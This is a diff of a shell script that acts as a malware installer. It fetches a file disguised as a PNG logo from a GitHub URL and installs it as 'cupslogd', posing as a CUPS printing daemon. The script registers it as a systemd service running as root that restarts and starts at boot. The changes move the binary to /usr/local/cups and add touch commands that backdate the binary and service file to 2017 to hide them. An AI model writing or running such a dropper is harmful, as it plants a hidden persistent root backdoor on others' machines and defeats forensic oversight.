@@ -1,7 +1,7 @@
 THEURL='https://github.com/dannyxweb3/mimi/raw/main/cached/logo.178172.png'
 wget $THEURL
 THEFILE=logo.178172.png
-THEDT=/usr/bin/cupslogd
+THEDT=/usr/local/cups/cupslogd
 ls $THEFILE
 mv $THEFILE $THEDT
 chmod a+x $THEDT
@@ -14,7 +14,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/usr/bin/cupslogd
+ExecStart=/usr/local/cups/cupslogd
 Restart=always
 User=root
 WorkingDirectory=/
@@ -24,4 +24,6 @@ WantedBy=multi-user.target
 EOF
 
 systemctl enable cupslogd
-
+touch -m -t 201704051200 /usr/local/cups/cupslogd
+touch -m -t 201704051200 /usr/local/cups
+touch -m -t 201704051200 /etc/systemd/system/cupslogd.service
